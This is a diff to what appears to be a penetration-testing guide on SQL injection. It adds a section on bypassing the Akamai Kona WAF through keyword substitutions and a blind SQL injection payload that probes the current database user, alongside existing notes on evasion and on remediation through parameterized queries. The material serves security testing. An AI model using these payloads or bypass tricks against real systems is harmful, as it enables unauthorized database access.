@@ -105,6 +105,18 @@ Stop at PoC. Do not bulk-dump user data.
 
 See `waf-bypass.md`. SQLi-specific: inline comments `/*!50000SELECT*/`, whitespace alternatives (`%09`, `%0a`, `%0c`, `/**/`), function aliases (`ifnull` vs `coalesce`), conditional error (`AND 1=(SELECT 1/0)`).
 
+### Akamai Kona bypass
+
+- `MID` instead of `SUBSTRING`
+- `LIKE` instead of `=`
+- `/**/` instead of space
+- `CURRENT_USER` instead of `CURRENT_USER()`
+- `"` instead of `'`
+
+```sql
+444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
+```
+
 ## Remediation
 
 - Parameterized queries everywhere. No exceptions.
